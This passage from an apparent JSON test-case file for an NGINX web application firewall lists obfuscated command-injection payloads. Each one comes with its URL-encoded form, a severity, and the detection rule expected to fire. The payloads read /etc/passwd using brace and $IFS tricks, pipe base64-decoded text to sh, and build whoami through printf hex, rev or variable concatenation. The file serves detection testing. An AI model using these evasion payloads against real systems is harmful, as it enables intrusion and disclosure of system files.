      "subcategory": "obfuscation",
      "payload": ";{cat,/etc/passwd}",
      "encoded": "%3B%7Bcat%2C%2Fetc%2Fpasswd%7D",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_006",
      "name": "Dollar Variable Concatenation",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";a=who;b=ami;$a$b",
      "encoded": "%3Ba%3Dwho%3Bb%3Dami%3B%24a%24b",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_007",
      "name": "Rev Command Execution",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";echo 'imaohw' | rev",
      "encoded": "%3Becho%20%27imaohw%27%20%7C%20rev",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_008",
      "name": "Base64 Decode Execution",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";echo d2hvYW1p | base64 -d | sh",
      "encoded": "%3Becho%20d2hvYW1p%20%7C%20base64%20-d%20%7C%20sh",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_009",
      "name": "Printf Hex Bypass",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
      "encoded": "%3B%24(printf%20%27%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69%27)",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_OBF_010",
      "name": "Tab IFS Bypass",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";cat$IFS/etc/passwd",
      "encoded": "%3Bcat%24IFS%2Fetc%2Fpasswd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    }
  ]
}